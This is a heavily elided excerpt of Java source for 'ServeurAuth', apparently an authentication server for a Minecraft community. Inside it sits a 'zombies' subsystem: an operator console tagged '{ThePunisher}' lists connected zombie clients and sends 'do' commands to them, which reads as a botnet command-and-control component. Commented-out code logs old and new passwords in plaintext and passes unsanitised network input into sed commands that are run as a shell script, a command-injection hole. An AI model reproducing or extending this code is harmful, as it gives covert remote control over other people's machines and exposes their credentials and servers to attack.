...
public class ServeurAuth
{
    ...
    final static int port = 59723, CHECK_ALIVE = 5000, TIME_OUT_ALIVE = 3; // 59722 for Admin Sys and 59723 for any user
    ...
    static String path = new File("").getAbsolutePath() + File.separatorChar, minecraftServer = "[MCServer] ", fatalAlert = "[FATAL ALERT] ", directory = File.separatorChar + "home" + File.separatorChar + "altiscraft" + File.separatorChar + "AltisCraft.fr" + File.separatorChar,
            ts = File.separatorChar + "home" + File.separatorChar + "AltisCraft.fr" + File.separatorChar + "TS" + File.separatorChar + "TS.php", PUNISHER = "{ThePunisher}", zombiesPath = path + "zombies" + File.separatorChar;
    static File accessories = new File(path + "Accessories.txt"), log = new File(path + "Log" + File.separatorChar + "Log.log"), logZB = new File(path + "Log" + File.separatorChar + "LogZB.log"), logZBA = new File(path + "Log" + File.separatorChar + "LogZBA.log"), fichier, data = new File(path + "Data"), ipsNotSafeFile = new File(path + "Banned-ips.txt"), zombies = new File(zombiesPath);
    ...
    private static boolean needZero(String f)
    {
        try
        {
            ...
            // !f.contains("54.38.241.7") && !f.contains("90.127.196.172") && !f.contains("192.168.1.") && !f.contains("109.30.118.83") && !f.contains("82.124.163.161") && !f.contains("100.112.35.29")
            // &&
    ...
    public static <ProcessBuild> void main(String args[]) // can't required admin user with java version
    {
        String startMsg = "Lancement du serveur d'Authentification sur le port " + port + " !";
        read(startMsg);
        read(startMsg, PUNISHER);
        writeZBA(startMsg);
            ...
            public void run()
            {
                try
                {
                    ...
                    while(scanner.hasNextLine())
                    {
                        ...
                        read("Command entered: " + command, PUNISHER);
                        if(command.startsWith("count "))
                        {
                            if(command.equalsIgnoreCase("count get"))
                            {
                                read("Zombies list: " + zombiesList.size(), PUNISHER);
                            }
                            else if(command.equalsIgnoreCase("count status"))
                            {
                                read("Count status: " + count, PUNISHER);
                            }
                            else
                                read("Command not understood.", PUNISHER);
                        }
                        else if(command.equalsIgnoreCase("displayZombies"))
                        {
                            int len = zombiesList.size();
                            if(len == 0)
                                read("No zombie available.", PUNISHER);
                            Iterator<String> iterator = zombiesList.keySet().iterator();
                            read("There are " + zombiesList.size() + " zombies:", PUNISHER);
                            int i = 0;
                            while(iterator.hasNext())
                            {
                                read("[" + i + "] " + iterator.next(), PUNISHER);
                                i++;
                            }
                        }
                        ...
                        else if(command.startsWith("do "))
                        {
                            ...
                            {
                                read(parts[1] + " isn't in the zombies system, can't proceed !", PUNISHER);
                                continue;
                            }
                            ...
                            read("Nothing has been written.", PUNISHER);
                        else
                            read("Command not understood.", PUNISHER);
                    }
                    scanner.close();
        ...
        while(true)
        {
            try
            {
                ...
                if(isSafeIP(ip))
                {
                    ...
                    if(type.equals("Z"))
                    {
                        if(!info0.equals("alive")) // manage if someone take the ip of one other ?
                        {
                            writeZB(ip);
                            writeZB("Données arrivées non traitées : " + packetData);
                        }
                        else
                        {
                            writeZBA(ip);
                            writeZBA("Données arrivées non traitées : " + packetData);
                        }
                        ...
                        else
                        {
                            ...
                            else if(info0.equals("output"))
                            {
                                writeZB("Output printed !");
                            }
                            else if(info0.equals("read"))
                            {
                     ...
                     * {
                     * read("Changement de mot de passe...");
                     * read("Pseudo = " + info0);
                     * Scanner scan = new Scanner(new File(path + File.separatorChar + "Data" + File.separatorChar + info0 + "!" + packet.getAddress().toString().replaceAll("/", "") + ".txt"));
                     * String oldPassword = "NoAttributionException";
                     * if(scan.hasNextLine())
                     * oldPassword = scan.nextLine();
                     * read("Ancien mot de passe = " + oldPassword);
                     * read("Nouveau mot de passe = " + info1);
                     * File actualFile = new File(path + File.separatorChar + "Data" + File.separatorChar + info0 + "!" + packet.getAddress().toString().replaceAll("/", "") + ".txt"), temporaryFile =
                     * new File(path + File.separatorChar + "Data" + File.separatorChar + info0 + "!" + packet.getAddress().toString().replaceAll("/", "") + ".temp");
                     * scan.close();
                     * actualFile.renameTo(temporaryFile);
                     ...
                     * {
                     * if(info0.equalsIgnoreCase("localhost"))
                     * info0 = ip;
                     * File temp = new File(ts.replace("TS.php", "") + "temp.sh");
                     * FileWriter fw = new FileWriter(temp);
                     * fw.write("#!/bin/bash\nsed -i '6i\\\"tsip\\\" => \\\"" + info0 + "\\\",' " + ts);
                     * fw.write("\nsed -i '7i\\\"tsport\\\" => \\\"" + info1 + "\\\",' " + ts);
                     * fw.write("\nsed -i '8i\\\"ts_query_admin\\\" => \\\"" + parts[3] + "\\\",' " + ts);
                     * fw.write("\nsed -i '9i\\\"ts_query_password\\\" => \\\"" + parts[4] + "\\\",' " + ts);
                     * fw.write("\nsed -i '10i\\\"ts_query_port\\\" => \\\"" + parts[5] + "\\\",' " + ts);
                     * fw.write("\nsed -i '11i\\\"ts_query_user_nick\\\" => \\\"" + parts[6] + "\\\");' " + ts);
                     * String command = "";
                     ...
                     * fw.write("\nsed -i -e '9d' " + ts);
                     * fw.close();
                     * p = new ProcessBuilder(temp.getAbsolutePath());
                     * p.start();
                     * }
                     * else if(type.equals("Accessories"))
                     * {
                     * ArrayList<String> keys = new ArrayList<String>();
                     * Scanner scan = new Scanner(accessories);
                     * while(scan.hasNextLine())
                     * keys.add(scan.nextLine());
                     * scan.close();
                     * if(info0.equals("check"))
                     * {
                     * boolean checked = false;
                     * for(int j = 0; j < keys.size(); j++)
                     * if(keys.get(j).equals(info1 + " " + info2.replaceAll(" ", "_")))
                     * {
                     * socket.send(new DatagramPacket("1".getBytes(), "1".length(), packet.getAddress(), packet.getPort()));
                     * checked = true;
                     * read("Accessoire autorisé !");
                     * break;
                     * }
                     * if(!checked)
                     * {
                     * socket.send(new DatagramPacket("0".getBytes(), "0".length(), packet.getAddress(), packet.getPort()));
                     * read("Accessoire refusé !");
                     * }
                     * }
                     * else if(info0.equals("define"))
                     * {
                     * accessories.delete();
                     * FileWriter fw = new FileWriter(accessories);
                     * for(int j = 0; j < keys.size(); j++)
                     * fw.write(keys.get(j) + "\n");
                     * fw.write(info1 + " " + info2);
                     * fw.close();
